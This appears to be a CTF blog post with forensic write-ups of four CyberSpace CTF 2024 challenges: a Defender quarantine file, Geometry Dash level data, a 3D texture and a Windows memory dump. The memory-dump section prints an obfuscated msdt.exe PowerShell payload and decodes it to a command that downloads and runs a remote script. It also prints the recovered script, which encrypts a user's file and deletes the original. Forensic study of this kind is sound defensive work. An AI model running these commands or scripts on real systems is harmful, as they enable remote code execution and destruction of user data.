---
layout: post
title: CSCTF2024
date: 2024-09-02 14:31 +0100
categories: [ctf]
tag : [forensics, rev]
image: /assets/ctf/csctf/logo.png
---

A deep dive into the latest CyberSpace CTF event, featuring comprehensive writeups on every forensics challenge and two exciting reverse engineering mobile challenges. Big shoutout to the amazing authors and organizers who made this CTF possible—your creativity and effort drive our passion for cybersecurity !

## Social Distancing [Forensics]

Solves: `156` Points: `50` Author: `RJCyber`

Description: `We all remember the time of social distancing and quarantines. How about some quarantined malware? Bet you can't understand what it entails!`

<a href="/assets/zip/csctf/handout_social-distancing.zip" class="btn btn-custom" download>
  <i class="fas fa-download"></i> handout_social-distancing.zip
</a>

<br>

The challenge provides a zip file containing Windows Defender artifact, which is the Quarantine folder where all quarantined files reside :

```
└─$ zipinfo handout_social-distancing.zip   
Archive:  handout_social-distancing.zip
Zip file size: 2900 bytes, number of entries: 8
drwx---     2.0 fat        0 b- stor 24-Aug-26 22:20 Quarantine/Entries/
-rw-a--     2.0 fat      390 b- stor 24-Aug-26 22:17 Quarantine/Entries/{80008A1B-0000-0000-7091-E5797219933B}
drwx---     2.0 fat        0 b- stor 24-Aug-26 22:20 Quarantine/ResourceData/
drwx---     2.0 fat        0 b- stor 24-Aug-26 22:20 Quarantine/ResourceData/95/
-rw-a--     2.0 fat     1166 b- stor 24-Aug-26 22:17 Quarantine/ResourceData/95/957997B71FBF912F2A3E881A13A83E0FAB3ECB47
drwx---     2.0 fat        0 b- stor 24-Aug-26 22:20 Quarantine/Resources/
drwx---     2.0 fat        0 b- stor 24-Aug-26 22:20 Quarantine/Resources/95/
-rw-a--     2.0 fat      108 b- stor 24-Aug-26 22:17 Quarantine/Resources/95/957997B71FBF912F2A3E881A13A83E0FAB3ECB47
8 files, 1664 bytes uncompressed, 1664 bytes compressed:  0.0%
```
Since Windows Defender uses RC4 encryption for the quarantine using a key, it is convenient to decrypt it using a simple script. I personally use this one from https://github.com/knez/defender-dump.

I proceed by placing the Quarantine folder inside my VM's C drive in C:\ProgramData\Microsoft\Windows Defender\ and run the script.
```
C:\Users\vboxuser\Desktop\forensic>python defender-dump/defender-dump.py -d C:\
Exporting test.ps1
File 'quarantine.tar' successfully created
```
We get a powershell file called test.ps1, the content seems to be base64 encoded.
```
$hidden = @"
UEsDBAoAAAAAAOCYuCg8z1FoRAAAAEQAAAAJABwAZWljYXIuY29tVVQJAAOUYCw5y1zNZnV4CwAB
BAAAAAAEAAAAAFg1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJ
VklSVVMtVEVTVC1GSUxFISRIK0gqUEsDBAoAAAAAAE8HG1mJ3nc0MQAAADEAAAAEABwAZmxhZ1VU
CQAD9VzNZtVczWZ1eAsAAQQAAAAABAAAAABDU0NURnt5MHVfdW4tcXU0cmFudDFuM2RfbXlfc2Ny
MVB0IV8weDkxYTNlZGZmNn0KUEsBAh4DCgAAAAAA4Ji4KDzPUWhEAAAARAAAAAkAGAAAAAAAAQAA
AKSBAAAAAGVpY2FyLmNvbVVUBQADlGAsOXV4CwABBAAAAAAEAAAAAFBLAQIeAwoAAAAAAE8HG1mJ
3nc0MQAAADEAAAAEABgAAAAAAAEAAACkgYcAAABmbGFnVVQFAAP1XM1mdXgLAAEEAAAAAAQAAAAA
UEsFBgAAAAACAAIAmQAAAPYAAAAAAA==
"@

$decodedBytes = [System.Convert]::FromBase64String($hidden)

$zipFilePath = "malicious.zip"
[System.IO.File]::WriteAllBytes($zipFilePath, $decodedBytes)

Write-Output "File saved as $zipFilePath"
```
Decoding it on host machine reveals the flag.
```
└─$ echo "UEsDBAoAAAAAAOCYuCg8z1FoRAAAAEQAAAAJABwAZWljYXIuY29tVVQJAAOUYCw5y1zNZnV4CwAB      
BAAAAAAEAAAAAFg1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJ
VklSVVMtVEVTVC1GSUxFISRIK0gqUEsDBAoAAAAAAE8HG1mJ3nc0MQAAADEAAAAEABwAZmxhZ1VU
CQAD9VzNZtVczWZ1eAsAAQQAAAAABAAAAABDU0NURnt5MHVfdW4tcXU0cmFudDFuM2RfbXlfc2Ny
MVB0IV8weDkxYTNlZGZmNn0KUEsBAh4DCgAAAAAA4Ji4KDzPUWhEAAAARAAAAAkAGAAAAAAAAQAA
AKSBAAAAAGVpY2FyLmNvbVVUBQADlGAsOXV4CwABBAAAAAAEAAAAAFBLAQIeAwoAAAAAAE8HG1mJ
3nc0MQAAADEAAAAEABgAAAAAAAEAAACkgYcAAABmbGFnVVQFAAP1XM1mdXgLAAEEAAAAAAQAAAAA
UEsFBgAAAAACAAIAmQAAAPYAAAAAAA=="|base64 -d
PK
���(<�QhDD      eicar.comUT     �`,9�\�fux
                                          X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*PK
O��w411flagUT   �\�f�\�fux
                          CSCTF{y0u_un-qu4rant1n3d_my_scr1Pt!_0x91a3edff6}
PK
���(<�QhDD      ▒��eicar.comUT�`,9ux
                                    PK
O��w411▒���flagUT�\�fux
                       PK��
```
Flag: `CSCTF{y0u_un-qu4rant1n3d_my_scr1Pt!_0x91a3edff6}`

## Geometry Dash 2.1 [Forensics]

Solves: `144` Points: `50` Author: `quasar098`

Description: `I would give you the flag but I can't let go (haha get it). use GDBrowser for the last step btw.`

<a href="/assets/zip/csctf/handout_social-distancing.zip" class="btn btn-custom" download>
  <i class="fas fa-download"></i> handout_social-distancing.zip
</a>

<br>

The challenge provides a CCLocalLevels.dat file, which is a file used by Geometry Dash to store data about custom levels that the player has created or downloaded. This file contains various pieces of information, including:
- Level Data: Information about the layout, objects, and obstacles in a custom level.
- Metadata: Details such as the level's name, description, creator, and the level ID.
- Player Progress: The player's progress in these custom levels, including completion status and scores.

I start by decrypting the file using this python script from a [github gist](https://gist.github.com/FaltoGH/b7563b425e10de41c56bf7af0dc4c864).
The resulting file is in xml format, opening the file on notepad reveals some base64 encoded information, so i head out to CyberChef for conveniency and try to decypher the messages.

![alt text](../assets/ctf/csctf/cyberchef.png)

It reveals some interesting information.
```
flag is in the level somewhere
the text below consists of multiple text objects
perhapstry95484635
stop playing the game!
CSCTFa52de5
```

Heading into GDBrowser with the revealed information, i try to query for the 95484635 id in search bar.

![alt text](../assets/ctf/csctf/gdbrowser1.png)

It seems to be a level made by user CSCTFa52de5, which was mentionned last in the xml file. Checking the level's comments section reveals the flag.

![alt text](../assets/ctf/csctf/gdbrowser2.png)

Flag: `CSCTF{geometry_dash_d0895c120d671b}`

## 3D Obj [Forensics]

Solves: ``81`` Points: `212` Author: `aa.crypto`

Description: `I am sending you my secret cube. I hope you could read my secret from the little colourful squares?`

<a href="/assets/zip/csctf/handout_3d_obj.zip" class="btn btn-custom" download>
  <i class="fas fa-download"></i> handout_3d_obj.zip
</a>

<br>

This challenge provides a zip file containing a mesh files with a texture file in png format.
```
└─$ zipinfo handout_3d_obj.zip 
Archive:  handout_3d_obj.zip
Zip file size: 620602 bytes, number of entries: 3
-rw-a--     6.3 fat  1856597 bx defN 24-Aug-25 23:52 chall.obj
-rw-a--     6.3 fat       91 bx defN 24-Aug-25 23:04 cube.mtl
-rw-a--     6.3 fat     5802 bx stor 24-Aug-25 22:13 tex.png
3 files, 1862490 bytes uncompressed, 620196 bytes compressed:  66.7%
```

I loaded the files on [3dviewer](https://3dviewer.net/), getting the full experience of the 3D object.

![alt text](../assets/ctf/csctf/3d0.png)

Nothing seemed out of the ordinary, inspecting the inside of cube doesn't reveal anything, but zooming out glitches a bit and kind of reveals some weird looking squares.

![alt text](../assets/ctf/csctf/3d0.5.png)

Interesting, i export the cube in .glb format then head to Threejs's online editor. There, it becomes obvious by tinkering settings like blending.

![alt text](../assets/ctf/csctf/3d1.png)

Flag is shown clearly on 4 faces after export. 
The parts are CSCTF{ (face 1) H1d1ng (face 2) _in_T3 (face 3) x7ur3} (face 4).

Flag: `CSCTF{H1d1ng_in_T3x7ur3}`

## Memory [Forensics]

Solves: `53` Points: `379` Author: `47gg`

Description: `I left the image of the flag in the desktop but somehow it disappeared, can you help me recover it?`

<a href="https://drive.google.com/file/d/1OqrNosho2yYFSu05sNKamQ1VeQcDzRVn/view?usp=sharing" class="btn btn-custom" download>
  <i class="fas fa-download"></i> mem.zip
</a> 

[alternate mirror](https://drive.google.com/file/d/1hGiy8z73YPDV5E0OnZYA-MJZ5WcBzskT/view?usp=sharing)

<br>

For this challenge, we are provided with a memory dump, this calls for [volatility](https://github.com/volatilityfoundation/volatility).

I start off by checking the memory's operating system profile, but it takes too long so i kind of cheat and use volatility's windows cmdline plugin which confirms that it is indeed a dump of a windows machine.
```
└─$ python vol.py -f ./volatility/mem.dmp windows.cmdline.CmdLine       
Volatility 3 Framework 2.7.0
Progress:  100.00               PDB scanning finished                                
PID     Process Args

4       System  Required memory at 0x20 is not valid (process exited?)
68      Registry        Required memory at 0x20 is not valid (process exited?)
320     smss.exe        \SystemRoot\System32\smss.exe
<SNIP>
1120    msdt.exe        "C:\Windows\system32\msdt.exe" ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuZG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjEwLjg6ODA4MC9RT2FBZGNUNmRxLnBzMScp'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO"
<SNIP>
3212    notepad.exe     "C:\Windows\system32\NOTEPAD.EXE" C:\Users\gg\Desktop\note.txt
3296    TB03S.exe       "C:\TB03S\TB03S.exe" 
3704    WMIADAP.exe     wmiadap.exe /F /T /R
3520    WmiPrvSE.exe    C:\Windows\system32\wbem\wmiprvse.exe
5212    DumpIt.exe      "C:\Users\gg\Desktop\x64\DumpIt.exe" 
4264    conhost.exe     \??\C:\Windows\system32\conhost.exe 0x4
6140    WmiPrvSE.exe    C:\Windows\system32\wbem\wmiprvse.exe
242533  �       Required memory at 0x3eba7 is not valid (process exited?)
```
This reveals two important pieces of information, one, the hint provided in the description of the challenge matches process of pid 3212 responsible of note.txt in gg's desktop, two, the process of pid 1120 msdt.exe ran an obfuscated powershell payload.

The latter seemed promising, so i tried deobfuscating.
```
└─PS> $pp='[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuZG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjEwLjg6ODA4MC9RT2FBZGNUNmRxLnBzMScp'+[char]34+'))'
└─PS> $pp                                                                                                                                                      [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuZG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjEwLjg6ODA4MC9RT2FBZGNUNmRxLnBzMScp"))
└─$ echo "SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuZG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjEwLjg6ODA4MC9RT2FBZGNUNmRxLnBzMScp"|base64 -d
IEX(New-Object Net.WebClient).downloadString('http://192.168.10.8:8080/QOaAdcT6dq.ps1')
```
This reveals that a powershell script was run on gg's machine, which pushes me to dump the powershell evtx file in order to understand more.
```
└─$ python vol.py -f ./mem.dmp windows.filescan.FileScan | grep evtx    
0xe5075e11d8f0.0\Windows\System32\winevt\Logs\Microsoft-Windows-Diagnosis-Scheduled%4Operational.evtx   216
0xe5075e135e00  \Windows\System32\winevt\Logs\Microsoft-Windows-TaskScheduler%4Maintenance.evtx 216
<SNIP>
0xe50764da0a20  \Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx    216
0xe50764da67e0  \Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Admin.evtx  216
<SNIP>
└─$ python vol.py -f ./mem.dmp windows.dumpfiles --virtaddr 0xe50764da0a20                
Volatility 3 Framework 2.7.0
Progress:  100.00               PDB scanning finished                                
Cache   FileObject      FileName        Result

DataSectionObject       0xe50764da0a20  Microsoft-Windows-PowerShell%4Operational.evtx  Error dumping file
SharedCacheMap  0xe50764da0a20  Microsoft-Windows-PowerShell%4Operational.evtx  file.0xe50764da0a20.0xe5076266fc00.SharedCacheMap.Microsoft-Windows-PowerShell%4O
```
I head into my VM and open the file on windows event viewer. I stumble upon a 4104 event which executes a remote command, which is the powershell payload i was searching for.
![alt text](../assets/ctf/csctf/memory1.png)
Content being:
```
Creating Scriptblock text (1 of 1):
$ifPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'flag.jpg')
$efPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'flag.enc')

$aes = New-Object System.Security.Cryptography.AesManaged
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.GenerateKey()
$aes.GenerateIV()

$cee = [System.Convert]::ToBase64String($aes.Key)
$vee = [System.Convert]::ToBase64String($aes.IV)

$content = [System.IO.File]::ReadAllBytes($ifPath)

$encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)
$encryptedData = $encryptor.TransformFinalBlock($content, 0, $content.Length)

$encryptedBase64 = [System.Convert]::ToBase64String($encryptedData)

[System.IO.File]::WriteAllText($efPath, $encryptedBase64)

[System.Environment]::SetEnvironmentVariable("ENCD", $encryptedBase64, [System.EnvironmentVariableTarget]::User)
[System.Environment]::SetEnvironmentVariable("ENCK", $cee, [System.EnvironmentVariableTarget]::User)
[System.Environment]::SetEnvironmentVariable("ENCV", $vee, [System.EnvironmentVariableTarget]::User)

if (Test-Path $ifPath) {
    Remove-Item $ifPath -Force
}


ScriptBlock ID: 8a789c51-9154-4713-8e54-357d656c1681
Path: C:\Users\gg\AppData\Local\Temp\SDIAG_b2740452-4bf6-44d9-a6f4-96e62e11b646\monk.ps1
```
It is now clear that the flag which was a jpg file had been encrypted using AES, we only need to find ENCD ENCK ENCV values which are environnement variables.

To retrieve them, we can use volatility windows.envars.Envars plugin on the whole dump or use it only on 4264 conhost.exe process since it is a legitimate process.
```
└─$ python vol.py -f ./mem.dmp windows.envars.Envars --pid 4264               
Volatility 3 Framework 2.7.0
Progress:  100.00               PDB scanning finished                                
PID     Process Block   Variable        Value

4264    conhost.exe     0x1ef37c7a980   ALLUSERSPROFILE C:\ProgramData
4264    conhost.exe     0x1ef37c7a980   APPDATA C:\Users\gg\AppData\Roaming
4264    conhost.exe     0x1ef37c7a980   CommonProgramFiles      C:\Program Files\Common Files
4264    conhost.exe     0x1ef37c7a980   CommonProgramFiles(x86) C:\Program Files (x86)\Common Files
4264    conhost.exe     0x1ef37c7a980   CommonProgramW6432      C:\Program Files\Common Files
4264    conhost.exe     0x1ef37c7a980   COMPUTERNAME    DESKTOP-5LBRLH1
4264    conhost.exe     0x1ef37c7a980   ComSpec C:\Windows\system32\cmd.exe
4264    conhost.exe     0x1ef37c7a980   DriverData      C:\Windows\System32\Drivers\DriverData
4264    conhost.exe     0x1ef37c7a980   ENCD    ZmIx0TFZonSCqvD8Sp9Jfmc47L7XjylzHM8il7N3JYPj6lWI22Qa5UhY4OnYpu2eV1LLqwGGj/21ExPiySYmeQIl7yAnh2oPlB1V1+sV5B4Qk/CZk6mAAlF8IoDjtnbZ31qzEj9uaitqi+2RdnekDiKGFV9Y8LVvSfyNpsTUxig8Yja5vLgFhcNUDr3VR2tzcigiA7KLZshP4SbdmtskB<SNIP>
B3VMtXnqSk7Im5Y1FzV9JylqWL3Fgs7/SW3a6ThfWxXBuuo7sg9sjsI5Ca+tGVg+wLxA7ny6+t61K42CBE+8bJD1D6ouwg6jT1Qs9eYd+Wuq6nW/2UcFr/l+rfgU
4264    conhost.exe     0x1ef37c7a980   ENCK    dF3luZxgMqMjdv26DTzAZqhRHyQsLOiQCajdl6IapdE=
4264    conhost.exe     0x1ef37c7a980   ENCV    Yf1YXfocPY/iDTpVUsfklA==
4264    conhost.exe     0x1ef37c7a980   HOMEDRIVE       C:
4264    conhost.exe     0x1ef37c7a980   HOMEPATH        \Users\gg
4264    conhost.exe     0x1ef37c7a980   LOCALAPPDATA    C:\Users\gg\AppData\Local
4264    conhost.exe     0x1ef37c7a980   LOGONSERVER     \\DESKTOP-5LBRLH1
4264    conhost.exe     0x1ef37c7a980   NUMBER_OF_PROCESSORS    1
4264    conhost.exe     0x1ef37c7a980   OneDrive        C:\Users\gg\OneDrive
4264    conhost.exe     0x1ef37c7a980   OS      Windows_NT
4264    conhost.exe     0x1ef37c7a980   Path    C:\Program Files\Common Files\Oracle\Java\javapath;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\gg\AppData\Local\Microsoft\WindowsApps;C:\Users\gg\AppData\Local\Programs\retoolkit\network\nmap;C:\Users\gg\AppData\Local\Programs\retoolkit\bin;C:\Users\gg\AppData\Local\Programs\retoolkit\android\dex2jar;C:\Users\gg\AppData\Local\Programs\retoolkit\debuggers\hyperdbg;C:\Users\gg\AppData\Local\Programs\retoolkit\dotnet\de4dot;C:\Users\gg\AppData\Local\Programs\retoolkit\ole\lessmsi;C:\Users\gg\AppData\Local\Programs\retoolkit\ole\officemalscanner;C:\Users\gg\AppData\Local\Programs\retoolkit\processinspection\hollowshunter;C:\Users\gg\AppData\Local\Programs\retoolkit\processinspection\observer;C:\Users\gg\AppData\Local\Programs\retoolkit\processinspection\pesieve;C:\Users\gg\AppData\Local\Programs\retoolkit\programming\winpython\python-3.11.3.amd64;C:\Users\gg\AppData\Local\Programs\retoolkit\utilities\winapiexec
4264    conhost.exe     0x1ef37c7a980   PATHEXT .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
4264    conhost.exe     0x1ef37c7a980   PROCESSOR_ARCHITECTURE  AMD64
4264    conhost.exe     0x1ef37c7a980   PROCESSOR_IDENTIFIER    Intel64 Family 6 Model 154 Stepping 3, GenuineIntel
4264    conhost.exe     0x1ef37c7a980   PROCESSOR_LEVEL 6
4264    conhost.exe     0x1ef37c7a980   PROCESSOR_REVISION      9a03
4264    conhost.exe     0x1ef37c7a980   ProgramData     C:\ProgramData
4264    conhost.exe     0x1ef37c7a980   ProgramFiles    C:\Program Files
4264    conhost.exe     0x1ef37c7a980   ProgramFiles(x86)       C:\Program Files (x86)
4264    conhost.exe     0x1ef37c7a980   ProgramW6432    C:\Program Files
4264    conhost.exe     0x1ef37c7a980   PSModulePath    C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
4264    conhost.exe     0x1ef37c7a980   PUBLIC  C:\Users\Public
4264    conhost.exe     0x1ef37c7a980   SystemDrive     C:
4264    conhost.exe     0x1ef37c7a980   SystemRoot      C:\Windows
4264    conhost.exe     0x1ef37c7a980   TEMP    C:\Users\gg\AppData\Local\Temp
4264    conhost.exe     0x1ef37c7a980   TMP     C:\Users\gg\AppData\Local\Temp
4264    conhost.exe     0x1ef37c7a980   USERDOMAIN      DESKTOP-5LBRLH1
4264    conhost.exe     0x1ef37c7a980   USERDOMAIN_ROAMINGPROFILE       DESKTOP-5LBRLH1
4264    conhost.exe     0x1ef37c7a980   USERNAME        gg
4264    conhost.exe     0x1ef37c7a980   USERPROFILE     C:\Users\gg
4264    conhost.exe     0x1ef37c7a980   windir  C:\Windows
```
Now we use once again CyberChef to decrypt the flag.enc's content.
![alt text](../assets/ctf/csctf/memory2.png)

Downloading the image reveals the flag.
![alt text](../assets/ctf/csctf/memory3.png)

Flag: `CSCTF{p0w3r$h3ll_$@v3d_3v3ry7h1ng_1n_3nv@r$!_Congr@tul@t10n$!}`